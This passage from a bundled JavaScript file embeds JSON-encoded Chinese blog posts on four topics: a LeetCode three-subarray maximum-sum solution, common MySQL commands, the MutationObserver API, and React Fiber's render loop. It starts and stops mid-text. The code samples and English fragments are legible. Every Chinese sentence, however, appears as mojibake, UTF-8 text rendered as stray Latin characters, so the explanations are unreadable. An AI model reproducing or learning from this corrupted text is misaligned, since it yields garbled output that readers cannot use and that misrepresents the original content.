8-0</code>...</p>","slug":"LeetCode-huo-qu-zui-da-shou-yi-de-suan-fa","sha":"61921acd4c40080ae873343cffc1a26316b6f608"}')},559:function(n){n.exports=JSON.parse('{"content":"<p>ä¸€ä¸ªåªåŒ…å«æ­£æ•°çš„æ•°ç»„ï¼Œæ‰¾ä¸‰ä¸ªé•¿åº¦ä¸ºkçš„ä¸é‡å çš„å­æ•°ç»„ï¼Œä½¿å¾—æ‰€æœ‰å­æ•°ç»„çš„æ•°å­—ä¹‹å’Œæœ€å¤§ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>Input: [1,2,1,2,6,7,5,1], 2\\nOutput: [0, 3, 5]\\nExplanation: Subarrays [1, 2], [2, 6], [7, 5] correspond to the starting indices [0, 3, 5].\\nWe could have also taken [2, 1], but an answer of [1, 3, 5] would be lexicographically larger.</code></pre></code></pre><p>æ€è·¯ï¼š</p>\\n<ol>\\n<li><p>å› ä¸ºæ˜¯åˆ†å‰²æˆ3æ®µï¼Œè®¾å®šä¸ºleft,mid,rightã€‚</p>\\n</li>\\n<li><p>å®šä¹‰ä¸€ä¸ªæ•°ç»„<code>sums</code>ï¼Œå®ƒè®°å½•ä»0åˆ°<code>nums.length-k</code>ä¸Šæ¯ä¸€ä¸ªå¯¹åº”<code>k</code>ä¸ªå­æ•°ç»„çš„å’Œã€‚</p>\\n<p> ä¾‹å¦‚ï¼šnums:<code>[1,2,3,4]</code>,k:<code>2</code>ï¼Œé‚£ä¹ˆsumså°±æ˜¯<code>[1+2,2+3,3+4]</code></p>\\n</li>\\n<li><p>è®¡ç®—<code>left</code>ï¼Œä½¿<code>left</code>ä»å·¦åˆ°å³è®°å½•å½“å‰æœ€å¤§<code>index</code>ã€‚</p>\\n<p> è®¡ç®—<code>right</code>ï¼Œä½¿<code>right</code>ä»å³åˆ°å·¦è®°å½•å½“å‰æœ€å¤§<code>index</code>ã€‚</p>\\n<p> è¿™ä¹ˆåšæ˜¯å› ä¸ºå½“<code>left</code>å’Œ<code>right</code>è®°å½•å¥½äº†åï¼Œå°±å¯ä»¥ç›´æ¥æ§åˆ¶midçš„<code>index</code>ï¼Œæ¥è®¡ç®—å½“å‰å’Œã€‚</p>\\n<p> å¦‚æœ<code>mid</code>çš„èµ·å§‹<code>index</code>æ˜¯<code>n</code>ï¼Œé‚£ä¹ˆå½“å‰å·¦ç«¯èŒƒå›´å†…çš„æœ€å¤§å€¼å°±æ˜¯<code>left[n-k]</code>ï¼Œ\\n å½“å‰å³ç«¯èŒƒå›´å†…çš„æœ€å¤§å€¼å°±æ˜¯<code>right[n+k]</code>ã€‚</p>\\n<p> å¦‚ä¸‹å›¾ï¼Œå‡è®¾è¿™æ˜¯ä¸€ä¸ª<code>left</code>ï¼Œ<code>k</code>ä¸º2ï¼Œå½“å‰leftèŒƒå›´æ˜¯0~8ï¼Œé‚£ä¹ˆè¿™ä¸ªèŒƒå›´å†…æœ€å¤§å€¼ä¸€å®šæ˜¯8è¿™ä¸ªä½ç½®ã€‚</p>\\n<p> æ³¨æ„ï¼šè¿™é‡Œçš„å€¼å¹¶ä¸æ˜¯å®é™…å€¼ï¼Œè€Œæ˜¯å¯¹åº”<code>sums</code>çš„<code>index</code>æ‰€å¯¹åº”çš„å€¼ã€‚</p>\\n<pre><code><pre class=\\"hljs\\"><code> k=2\\n       |_|_|_|_|_|_|_|_|\\n  å€¼ï¼š 1 2 2 3 4 4 4 5 5\\n  idxï¼š0 1 2 3 4 5 6 7 8</code></pre></code></pre><p> å¦‚æœèŒƒå›´ç¼©å°ï¼Œ0~3ï¼Œé‚£ä¹ˆæœ€å¤§å€¼ä¸€å®šæ˜¯3è¿™ä¸ªä½ç½®</p>\\n<pre><code><pre class=\\"hljs\\"><code> k=2\\n       |_|_|_|\\n  å€¼ï¼š 1 2 2 3\\n  idxï¼š0 1 2 3</code></pre></code></pre><p> å› æ­¤<code>left</code>éœ€è¦ä»å·¦å¾€å³è¿›è¡Œè·å–æœ€å¤§å€¼ã€‚</p>\\n<p> å‡è®¾è¿™æ˜¯ä¸€ä¸ª<code>right</code>ï¼Œ<code>k</code>ä¸º2ï¼Œå½“å‰rightèŒƒå›´æ˜¯4~7ï¼Œé‚£ä¹ˆè¿™ä¸ªèŒƒå›´å†…æœ€å¤§å€¼ä¸€å®šæ˜¯4è¿™ä¸ªä½ç½®</p>\\n<pre><code><pre class=\\"hljs\\"><code> k=2\\n       |_|_|_|\\n  å€¼ï¼š 4 4 5 6\\n  idxï¼š4 5 6 7</code></pre></code></pre><p> å› æ­¤<code>right</code>éœ€è¦ä»å³å¾€å·¦è¿›è¡Œè·å–æœ€å¤§å€¼ã€‚</p>\\n</li>\\n<li><p>ç®—å‡º<code>left</code>å’Œ<code>right</code>åå°±ç®€å•äº†ï¼Œæˆ‘ä»¬åªéœ€è¦å°†ç¬¦åˆ<code>mid</code>çš„èŒƒå›´<code>[k,nums.length-k)</code>éå†ä¸€éï¼Œ\\n æ¯æ¬¡éå†éƒ½ç®—å‡ºå½“å‰ä¸‰ä¸ªæ®µçš„å’Œï¼Œæ±‚å‡ºæœ€å¤§å’Œä¾¿å¯ã€‚</p>\\n</li>\\n</ol>\\n<p>ä»£ç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">maxSumOfThreeSubarrays</span>(<span class=\\"hljs-params\\">nums,k</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> len=nums.length-k+<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">let</span> left=[],right=[],maxIndex=<span class=\\"hljs-number\\">0</span>,sums=[],sum=<span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;nums.length;i++){\\n    sum+=nums[i]\\n    <span class=\\"hljs-keyword\\">if</span>(i&gt;k<span class=\\"hljs-number\\">-1</span>)sum-=nums[i-k]\\n    <span class=\\"hljs-keyword\\">if</span>(i&gt;=k<span class=\\"hljs-number\\">-1</span>)sums[i-k+<span class=\\"hljs-number\\">1</span>]=sum  \\n  }\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">0</span>;i&lt;len;i++){\\n    <span class=\\"hljs-keyword\\">if</span>(sums[i]&gt;sums[maxIndex])maxIndex=i\\n    left[i]=maxIndex\\n  }\\n  maxIndex=len<span class=\\"hljs-number\\">-1</span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=len<span class=\\"hljs-number\\">-1</span>;i&gt;=<span class=\\"hljs-number\\">0</span>;i--){\\n   <span class=\\"hljs-keyword\\">if</span>(sums[i]&gt;sums[maxIndex])maxIndex=i\\n    right[i]=maxIndex\\n  }\\n  <span class=\\"hljs-keyword\\">let</span> res=[<span class=\\"hljs-number\\">0</span>,k,<span class=\\"hljs-number\\">2</span>*k]\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=k;i&lt;len;i++){\\n    <span class=\\"hljs-keyword\\">let</span> l=left[i-k],m=i,r=right[i+k]\\n    <span class=\\"hljs-keyword\\">if</span>(sums[l]+sums[m]+sums[r]&gt;sums[res[<span class=\\"hljs-number\\">0</span>]]+sums[res[<span class=\\"hljs-number\\">1</span>]]+sums[res[<span class=\\"hljs-number\\">2</span>]]){\\n      res[<span class=\\"hljs-number\\">0</span>]=l\\n      res[<span class=\\"hljs-number\\">1</span>]=m\\n      res[<span class=\\"hljs-number\\">2</span>]=r\\n    }\\n  }\\n  <span class=\\"hljs-keyword\\">return</span> res\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-26","timeArr":[2018,9,26,0,0,0,0],"title":"LeetCodeæœ€å¤§3ä¸ªä¸é‡å å­æ•°ç»„ä¹‹å’Œ","uuid":"761230c6c621098f0a8a2e62ab620dffa59a3460","summary":"<p>ä¸€ä¸ªåªåŒ…å«æ­£æ•°çš„æ•°ç»„ï¼Œæ‰¾ä¸‰ä¸ªé•¿åº¦ä¸ºkçš„ä¸é‡å çš„å­æ•°ç»„ï¼Œä½¿å¾—æ‰€æœ‰å­æ•°ç»„çš„æ•°å­—ä¹‹å’Œæœ€å¤§ã€‚</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre class=\\"hljs\\"><code>Input: [1,2,1,2,6,7,5,1], 2\\nOutput: [0, 3, 5]\\nExplanation: Subarrays [1, 2], [2, 6], [7, 5] correspond to th...</code></pre>","slug":"LeetCode-zui-da-3-ge-bu-chong-die-zi-shu-zu-zhi-he","sha":"abbf38ac11dcc38431445248ada55b000c3406ec"}')},560:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>ç»™è¡¨æ·»åŠ åˆ«å(Mæ˜¯moviesçš„åˆ«å,Tæ˜¯titleçš„è¾“å‡ºå)</li>\\n</ul>\\n<p><code>SELECT title as T  FROM movies M;</code></p>\\n<ul>\\n<li>æ·»åŠ row</li>\\n</ul>\\n<p><code>INSERT  INTO library VALUES (1,&#39;javascript&#39;,8);</code></p>\\n<ul>\\n<li>æ¡ä»¶æ’åºorder by</li>\\n</ul>\\n<p><code>SELECT *  FROM movies WHERE release_year&gt;1999 ORDER BY  release_year;</code></p>\\n<ul>\\n<li>SUM</li>\\n</ul>\\n<p><code>SELECT SUM(minutes) FROM todo_list;</code></p>\\n<ul>\\n<li>åµŒå¥—in</li>\\n</ul>\\n<p><code>SELECT title FROM songs WHERE artist IN (\\n    SELECT name FROM artists WHERE genre=&quot;Pop&quot;);</code></p>\\n<ul>\\n<li>like<pre><code><pre class=\\"hljs\\"><code>SELECT * FROM exercise_logs\\nWHERE type IN (\\n  SELECT type FROM drs_favorites \\n  WHERE reason LIKE &quot;%cardiovascular%&quot;\\n  );</code></pre></code></pre></li>\\n<li>å¤šé‡æ¡ä»¶é€‰æ‹©case...when..then<pre><code><pre class=\\"hljs\\"><code>SELECT Count(*),\\n  CASE \\n      WHEN number_grade&gt;90 THEN &quot;A&quot;\\n      WHEN number_grade&gt;80 THEN &quot;B&quot;\\n      WHEN number_grade&gt;70 THEN &quot;C&quot;\\n      ELSE &quot;F&quot;\\n  END AS &quot;letter_grade&quot;\\n  FROM student_grades \\n  GROUP BY letter_grade;</code></pre></code></pre></li>\\n<li>asåˆ«å group by...having<pre><code><pre class=\\"hljs\\"><code>SELECT author ,AVG(words) AS avg_words FROM books \\n  GROUP BY author\\n  HAVING avg_words &gt;150000;\\n</code></pre></code></pre></li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>\\n* andä¸”</code></pre></code></pre><p>SELECT persons.name,hobbies.name FROM persons\\nJOIN hobbies\\nWHERE persons.name=&#39;Bobby McBobbyFace&#39;\\nAND persons.id=hobbies.person_id;</p>\\n<pre><code><pre class=\\"hljs\\"><code>\\n* not in(A.idä¸å­˜åœ¨äºB.CustomerIdä¸­çš„æ•°æ®)</code></pre></code></pre><p>SELECT Name from Customers A\\nWHERE A.Id NOT IN (SELECT B.CustomerId from Orders B)</p>\\n<pre><code><pre class=\\"hljs\\"><code>\\n* not exist</code></pre></code></pre><p>SELECT A.Name from Customers A\\nWHERE NOT EXISTS (SELECT 1 FROM Orders B WHERE A.Id = B.CustomerId)</p>\\n<pre><code><pre class=\\"hljs\\"><code>\\n* left out join...onåˆå¹¶è¡¨å¹¶ä¸”å·¦è¾¹å…¨éƒ¨åˆå¹¶æ˜¾ç¤º</code></pre></code></pre><p>SELECT customers.name, customers.email, SUM(orders.price) AS total_price\\nFROM customers \\nLEFT OUTER JOIN orders\\nON orders.customer_id=customers.id\\nGROUP BY customers.id\\nORDER BY total_price desc;</p>\\n<pre><code><pre class=\\"hljs\\"><code>* åˆå¹¶å½“å‰è¡¨ left outer join xxx åˆ«å</code></pre></code></pre><p>/* join itself */\\nSELECT movies.title, sequel.title AS sequel_title\\nFROM movies\\nLEFT OUTER JOIN movies sequel\\nON movies.sequel_id=sequel.id;</p>\\n<pre><code><pre class=\\"hljs\\"><code>* å¤šé‡åˆå¹¶</code></pre></code></pre><p>/* multiple joins*/\\nSELECT a.fullname, b.fullname FROM friends\\nJOIN persons a\\nON a.id=friends.person1_id\\nJOIN persons b\\nON b.id=friends.person2_id;</p>\\n<pre><code><pre class=\\"hljs\\"><code>* æ›´æ–°å†…å®¹update</code></pre></code></pre><p>UPDATE documents SET author=&#39;Jackie Draper&#39;\\nWHERE author=&#39;Jackie Paper&#39;;</p>\\n<pre><code><pre class=\\"hljs\\"><code>* åˆ é™¤å†…å®¹\\n\\n`DELETE FROM documents WHERE title=&quot;Things I\'m Afraid Of&quot;;`\\n\\n* å¢åŠ è¡¨çš„åˆ—ï¼Œæ”¹å˜è¡¨ç»“æ„\\n\\n`ALTER TABLE clothes ADD COLUMN price INTEGER;`\\n\\n* å˜æ›´è¡¨å\\n\\n`ALTER TABLE travel_spots RENAME TO places_to_live;`</code></pre></code></pre>","toc":[],"relatedTags":null,"created_at":"2018-09-04","timeArr":[2018,8,4,0,0,0,0],"title":"MYSQLå¸¸ç”¨å‘½ä»¤è®°å½•","uuid":"b3f75a48780077e930c5409efefb6e27050a2057","summary":"<ul>\\n<li>ç»™è¡¨æ·»åŠ åˆ«å(Mæ˜¯moviesçš„åˆ«å,Tæ˜¯titleçš„è¾“å‡ºå)</li>\\n</ul>\\n<p><code>SELECT title as T  FROM movies M;</code></p>\\n<ul>\\n<li>æ·»åŠ row</li>\\n</ul>\\n<p><code>INSERT  INTO library VALUES (1,\'javascript\',8);</code></p>\\n<ul>\\n<li>æ¡ä»¶æ’åºorder by</li>\\n</ul>\\n<p>`SELECT *  F...</p>","slug":"MYSQL-chang-yong-ming-ling-ji-lu","sha":"876bcd03410d0865b98212677e8ea1297deefb8a"}')},561:function(n){n.exports=JSON.parse('{"content":"<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> observer=<span class=\\"hljs-keyword\\">new</span> MutationObserver(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">records</span>)</span>{\\n  <span class=\\"hljs-comment\\">// è·å–å˜åŒ–çš„DOMçš„ä¸€äº›å±æ€§ </span>\\n  records.API1\\n})</code></pre></code></pre>\\n<p>API1ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>API1={\\ntypeï¼šè§‚å¯Ÿçš„å˜åŠ¨ç±»å‹ï¼ˆattributeã€characterDataæˆ–è€…childListï¼‰ã€‚\\ntargetï¼šå‘ç”Ÿå˜åŠ¨çš„DOMèŠ‚ç‚¹ã€‚\\naddedNodesï¼šæ–°å¢çš„DOMèŠ‚ç‚¹ã€‚\\nremovedNodesï¼šåˆ é™¤çš„DOMèŠ‚ç‚¹ã€‚\\npreviousSiblingï¼šå‰ä¸€ä¸ªåŒçº§èŠ‚ç‚¹ï¼Œå¦‚æœæ²¡æœ‰åˆ™è¿”å›nullã€‚\\nnextSiblingï¼šä¸‹ä¸€ä¸ªåŒçº§èŠ‚ç‚¹ï¼Œå¦‚æœæ²¡æœ‰åˆ™è¿”å›nullã€‚\\nattributeNameï¼šå‘ç”Ÿå˜åŠ¨çš„å±æ€§ã€‚å¦‚æœè®¾ç½®äº†attributeFilterï¼Œåˆ™åªè¿”å›é¢„å…ˆæŒ‡å®šçš„å±æ€§ã€‚\\noldValueï¼šå˜åŠ¨å‰çš„å€¼ã€‚è¿™ä¸ªå±æ€§åªå¯¹attributeå’ŒcharacterDataå˜åŠ¨æœ‰æ•ˆï¼Œå¦‚æœå‘ç”ŸchildListå˜åŠ¨ï¼Œåˆ™è¿”å›nullã€‚\\n}</code></pre></code></pre><p> å¯åŠ¨ç›‘å¬ï¼š</p>\\n<p><code>observer.observe(element,options)</code></p>\\n<pre><code><pre class=\\"hljs\\"><code>options={\\nchildListï¼šå­èŠ‚ç‚¹çš„å˜åŠ¨ï¼ˆæŒ‡æ–°å¢ï¼Œåˆ é™¤æˆ–è€…æ›´æ”¹ï¼‰,\\nattributesï¼šå±æ€§çš„å˜åŠ¨,\\ncharacterDataï¼šèŠ‚ç‚¹å†…å®¹æˆ–èŠ‚ç‚¹æ–‡æœ¬çš„å˜åŠ¨,\\nsubtreeï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºæ˜¯å¦å°†è¯¥è§‚å¯Ÿå™¨åº”ç”¨äºè¯¥èŠ‚ç‚¹çš„æ‰€æœ‰åä»£èŠ‚ç‚¹,\\nattributeOldValueï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè§‚å¯Ÿattributeså˜åŠ¨æ—¶ï¼Œæ˜¯å¦éœ€è¦è®°å½•å˜åŠ¨å‰çš„å±æ€§å€¼,\\ncharacterDataOldValueï¼šå¸ƒå°”å€¼ï¼Œè¡¨ç¤ºè§‚å¯ŸcharacterDataå˜åŠ¨æ—¶ï¼Œæ˜¯å¦éœ€è¦è®°å½•å˜åŠ¨å‰çš„å€¼,\\nattributeFilterï¼šæ•°ç»„ï¼Œè¡¨ç¤ºéœ€è¦è§‚å¯Ÿçš„ç‰¹å®šå±æ€§ï¼ˆæ¯”å¦‚[\'class\',\'src\']ï¼‰\\n}</code></pre></code></pre><p>å‚è€ƒï¼š<a href=\\"http://javascript.ruanyifeng.com/dom/mutationobserver.html#toc1\\">http://javascript.ruanyifeng.com/dom/mutationobserver.html#toc1</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-29","timeArr":[2018,7,29,0,0,0,0],"title":"MutationObserverå¯¹è±¡","uuid":"e3b94840e980e8848b479296e62a83d39630ab76","summary":"<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> observer=<span class=\\"hljs-keyword\\">new</span> MutationObserver(<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">records</span>)</span>{\\n  <span class=\\"hljs-comment\\">// è·å–å˜åŒ–çš„DOMçš„ä¸€äº›å±æ€§ </span>\\n  records.API1\\n})\\n</code></pre>\\n<p>API1ï¼š</p>\\n<pre class=\\"hljs\\"><code>API1={\\ntypeï¼šè§‚å¯Ÿçš„å˜åŠ¨ç±»å‹ï¼ˆattributeã€characterDataæˆ–è€…chil...</code></pre>","slug":"MutationObserver-dui-xiang","sha":"8540f01502cc34ee1bdc412b3483427e52a8e911"}')},562:function(n){n.exports=JSON.parse('{"content":"<p>è¿™æ˜¯çœ‹äº†ä¸¤ç¯‡æ–‡ç« åä¸ªäººçš„ä¸€äº›æ€»ç»“å’Œç†è§£ï¼Œå¦‚æœæœ‰è¯¯ï¼Œè¿˜è¯·æŒ‡å‡ºï¼</p>\\n<blockquote>\\n<p><code>Fiber</code>å¯ä»¥çœ‹æˆä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒå†…éƒ¨åŒ…å«äº†å¯¹å½“å‰ç»„ä»¶çš„è¡Œä¸ºï¼ŒåŒ…æ‹¬å¯¹ç»„ä»¶è¡Œä¸ºçš„è·Ÿè¸ªã€å®‰æ’ã€æš‚åœå’Œå–æ¶ˆã€‚</p>\\n</blockquote>\\n<h3 id=\\"fiber-de-jie-gou\\">Fiberçš„ç»“æ„</h3>\\n<p><code>React</code>çš„ç»„ä»¶å¯¹è±¡æ¯æ¬¡<code>render</code>çš„æ—¶å€™éƒ½ä¼šé‡æ–°åˆ›å»º</p>\\n<p><code>React</code>ç»„ä»¶å¯¹è±¡å¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n    $$typeof: Symbol(react.element),\\n    type: \'button\',\\n    key: &quot;1&quot;,\\n    props: {\\n        children: \'Update counter\',\\n        onClick: () =&gt; { ... }\\n    }\\n}</code></pre></code></pre><p>è€Œ<code>Fiber</code>å¹¶ä¸ä¼šæ¯æ¬¡åˆ›å»ºï¼Œè€Œæ˜¯ç›´æ¥åœ¨åŸå†…å®¹ä¸Šä¿®æ”¹ã€‚</p>\\n<p>æ¯ä¸ªç»„ä»¶éƒ½æœ‰ä¸€ä¸ª<code>Fiber</code>ç»“æ„ï¼Œå®ƒä»¬å…±åŒç»„æˆäº†æ ‘ï¼Œè€Œå®ƒä»¬äº’ç›¸è¿æ¥é€šè¿‡<code>child</code>,<code>sibling</code>,<code>return</code>(ç›¸å½“äºparent)ã€‚</p>\\n<pre><code><pre class=\\"hljs\\"><code>  return\\n    |\\n  FiberNode --sibling\\n    |\\n  child</code></pre></code></pre><h3 id=\\"fiber-nei-bu-gong-zuo-fang-shi\\">Fiberå†…éƒ¨å·¥ä½œæ–¹å¼</h3>\\n<p><code>Fiber</code>å±•ç¤ºç»™ç”¨æˆ·çš„ç•Œé¢çš„çš„æ ‘ç§°ä¸º<code>current</code>æ ‘ï¼Œå†…éƒ¨è¿˜æœ‰ä¸€ä¸ª<code>workInProgress</code>æ ‘ï¼Œå®ƒä»¬äºŒè€…äº’ç›¸é€šè¿‡å±æ€§<code>alternate</code>å¼•ç”¨å¯¹æ–¹ã€‚</p>\\n<p>å½“ç»„ä»¶å†…éƒ¨æ‰§è¡Œ<code>redner</code>é˜¶æ®µæ›´æ–°æ—¶ï¼Œéƒ½æ˜¯åœ¨<code>workInProgress</code>å†…éƒ¨è¿›è¡Œï¼›</p>\\n<p>åœ¨<code>commit</code>é˜¶æ®µï¼Œ<code>workInProgress</code>æ ‘å˜ä¸º<code>current</code>æ ‘ï¼Œ<code>current</code>æ ‘å˜ä¸º<code>workInProgress</code>æ ‘ã€‚</p>\\n<h3 id=\\"fiber-de-render-jie-duan-he-commit-jie-duan\\">Fiberçš„renderé˜¶æ®µå’Œcommité˜¶æ®µ</h3>\\n<ul>\\n<li><p>renderé˜¶æ®µ</p>\\n<p>  <code>render</code>æ˜¯å¼‚æ­¥æ‰§è¡Œï¼Œå¯é˜»æ–­ï¼Œæ‰§è¡Œæ•ˆæœå¯¹ç”¨æˆ·ä¸å¯è§ã€‚</p>\\n<p>  æ‰§è¡Œæ–¹å¼æ˜¯é€šè¿‡4ä¸ªæ–¹æ³•å»éå†ä¸€æ£µæ ‘(<code>virtual stack</code>)ï¼š</p>\\n<ul>\\n<li><p>performUnitOfWork</p>\\n</li>\\n<li><p>beginWork</p>\\n</li>\\n<li><p>completeUnitOfWork</p>\\n</li>\\n<li><p>completeWork</p>\\n<p>å¦‚ä¸‹gif</p>\\n<p><img src=\\"/article/img/fiber-render-phase.gif\\" alt=\\"\\"></p>\\n<p><code>render</code>é˜¶æ®µæ˜¯åœ¨<code>workInProgress</code>æ ‘ä¸­æ‰§è¡Œï¼Œé€šè¿‡<code>nextEffect</code>å±æ€§å°†æ¯ä¸ªæ‰§è¡Œæ›´æ–°çš„ç»„ä»¶è¿æ¥ã€‚</p>\\n</li>\\n</ul>\\n</li>\\n<li><p>commité˜¶æ®µ</p>\\n<p>  <code>commit</code>æ˜¯åŒæ­¥æ‰§è¡Œæ›´æ–°é˜¶æ®µï¼Œä¸å¯é˜»æ–­ï¼Œæ‰§è¡Œæ•ˆæœå¯¹ç”¨æˆ·å¯è§ã€‚</p>\\n<p>  é€šè¿‡<code>nextEffect</code>çº¿æ€§æ‰§è¡Œ<code>commit</code>æ›´æ–°ã€‚</p>\\n</li>\\n</ul>\\n<h3 id=\\"fiber-nei-bu-de-loopï¼Œreact-shi-xian-fei-zu-se-render-de-ao-mi\\"><code>Fiber</code>å†…éƒ¨çš„loopï¼Œ<code>React</code>å®ç°éé˜»å¡<code>render</code>çš„å¥¥ç§˜</h3>\\n<p><code>React</code>å¤šä¸ªäº¤äº’ç»„ä»¶ç»„æˆäº†ä¸€æ£µæ ‘ï¼Œæ¯æ¬¡æ‰§è¡Œ<code>render</code>çš„æ—¶å€™ï¼Œéœ€è¦å»éå†è¿™æ£µæ ‘åˆ¤æ–­å“ªä¸ªç»„ä»¶éœ€è¦æ›´æ–°ã€‚</p>\\n<p>éå†ä¸€æ£µæ ‘ï¼Œå¯èƒ½æˆ‘ä»¬çš„ç¬¬ä¸€æƒ³æ³•å°±æ˜¯é€’å½’ï¼Œçš„ç¡®é€’å½’ç®€æ´æ˜äº†ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œä¸€æ—¦å®ƒæ²¿ç€æ ˆæ‰§è¡Œï¼Œé‚£å¿…é¡»å°†æ ˆæ‰§è¡Œåˆ°ç»“æŸã€‚\\nåœ¨è¿™ä¹‹å‰ï¼Œæ— æ³•å»æ£€æµ‹æ˜¯å¦æœ‰ä¼˜å…ˆçº§æ›´é«˜çš„ä»»åŠ¡ã€‚</p>\\n<p>å› æ­¤ï¼Œ<code>React</code>ä¸ºäº†ä¿è¯éé˜»å¡æ›´æ–°ï¼Œå®ƒä¸èƒ½ä½¿ç”¨é€’å½’çš„æ–¹æ³•éå†ï¼Œå®ƒéœ€è¦åœ¨æ¯ä¸ªç»„ä»¶<code>render</code>é˜¶æ®µæ‰§è¡Œå®Œæ¯•çš„åŒæ—¶ï¼Œå»æŸ¥çœ‹æ˜¯å¦æœ‰ä¼˜å…ˆçº§æ›´é«˜çš„ä»»åŠ¡ã€‚</p>\\n<p>è¿™é‡Œæ˜¯é€šè¿‡<code>requestIdleCallback</code>ä¸­çš„<code>deadline.timeRemaining()</code>æ£€æµ‹ï¼Œ<code>deadline.timeRemaining()</code>è¡¨ç¤ºåœ¨æµè§ˆå™¨ä¸‹ä¸€å¸§æ‰§è¡Œä¹‹å‰ï¼Œå½“å‰å¸§çš„å‰©ä½™æ—¶é—´ã€‚</p>\\n<p>æ¯ä¸ªç»„ä»¶<code>render</code>é˜¶æ®µå®Œæˆåï¼Œå¦‚æœæ£€æµ‹åˆ°è¿˜æœ‰å‰©ä½™æ—¶é—´ï¼Œåˆ™ç»§ç»­ä¸‹ä¸€ä¸ªç»„ä»¶çš„<code>render</code>ã€‚</p>\\n<p>é‚£ä¹ˆ<code>React</code>æ€ä¹ˆæ ·æ‰èƒ½åœ¨ä¸€æ£µæ ‘å†…éƒ¨éå†ï¼Œå¹¶ä¸”æ¯æ¬¡éƒ½æ¸…ç©ºæ ˆï¼Œæ£€æŸ¥å‰©ä½™æ—¶é—´ï¼Ÿ</p>\\n<p>å®ƒä½¿ç”¨äº†ä¸€ç§å«åš<code>virtual stack</code>(è™šæ‹Ÿæ ˆ)ï¼Œä¸€ä¸ªwhileå¾ªç¯ã€‚</p>\\n<p>å®ƒçš„å®ç°ä¾èµ–äº†<code>Fiber</code>ç»“æ„çš„<code>return</code>å±æ€§ï¼Œç¡®ä¿èƒ½æ­£ç¡®å›åˆ°å½“å‰è°ƒç”¨ç»„ä»¶çš„ä¸Šä¸€å±‚ã€‚</p>\\n<p>é€šè¿‡<code>virtual stack</code>ï¼Œèƒ½å¤Ÿå®ç°é€’å½’çš„æ‰§è¡Œé¡ºåºå¹¶ä¸”æ²¡æœ‰æ ˆçš„å †å ã€‚</p>\\n<p>å®ç°ç±»ä¼¼å¦‚ä¸‹ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">walk</span>(<span class=\\"hljs-params\\">o</span>) </span>{\\n  <span class=\\"hljs-keyword\\">let</span> root = o;\\n  <span class=\\"hljs-keyword\\">let</span> current = o;\\n\\n  <span class=\\"hljs-keyword\\">while</span> (<span class=\\"hljs-literal\\">true</span>) {\\n    <span class=\\"hljs-keyword\\">let</span> child = doRenderWork(current);\\n    <span class=\\"hljs-comment\\">// å‘ç°å­ç»„ä»¶ï¼Œé‡å¤æ‰§è¡Œï¼Œè¿™é‡Œæ²¡æœ‰æ ˆ(æ¨¡æ‹Ÿå…¥æ ˆ)</span>\\n    <span class=\\"hljs-keyword\\">if</span> (child) {\\n      current = child;\\n      <span class=\\"hljs-keyword\\">continue</span>;\\n    }\\n    <span class=\\"hljs-comment\\">// å‘ç°å·²ç»åˆ°è¾¾èµ·ç‚¹ï¼Œé€€å‡º</span>\\n    <span class=\\"hljs-keyword\\">if</span> (current === root) {\\n      <span class=\\"hljs-keyword\\">return</span>;\\n    }\\n    <span class=\\"hljs-comment\\">// å½“æ— childï¼Œå¹¶ä¸”æ— siblingï¼Œé€šè¿‡returnè¿”å›ä¸Šä¸€å±‚(æ¨¡æ‹Ÿå‡ºæ ˆ)</span>\\n    <span class=\\"hljs-keyword\\">while</span> (!current.sibling) {\\n      <span class=\\"hljs-comment\\">// åˆ°è¾¾åŸå§‹ç‚¹æˆ–è€…æ— æ³•returnï¼Œé€€å‡º</span>\\n      <span class=\\"hljs-keyword\\">if</span> (!current.return || current.return === root) {\\n        <span class=\\"hljs-keyword\\">return</span>;\\n      }\\n      <span class=\\"hljs-comment\\">// set the parent as the current active node</span>\\n      current = current.return;\\n    }\\n    <span class=\\"hljs-comment\\">// å­˜åœ¨siblingï¼Œè¿›å…¥sibling</span>\\n    current = current.sibling;\\n  }\\n}</code></pre></code></pre>\\n<h3 id=\\"fiber-de-effectlist\\"><code>Fiber</code>çš„<code>EffectList</code></h3>\\n<p>å½“ä¸€æ£µç»„ä»¶æ ‘å†…éƒ¨æœ‰å¤šä¸ªç»„ä»¶éœ€è¦æ›´æ–°ï¼Œ<code>Fiber</code>åœ¨<code>render</code>é˜¶æ®µé€šè¿‡<code>virtual stack</code>çš„æ–¹å¼å»æ 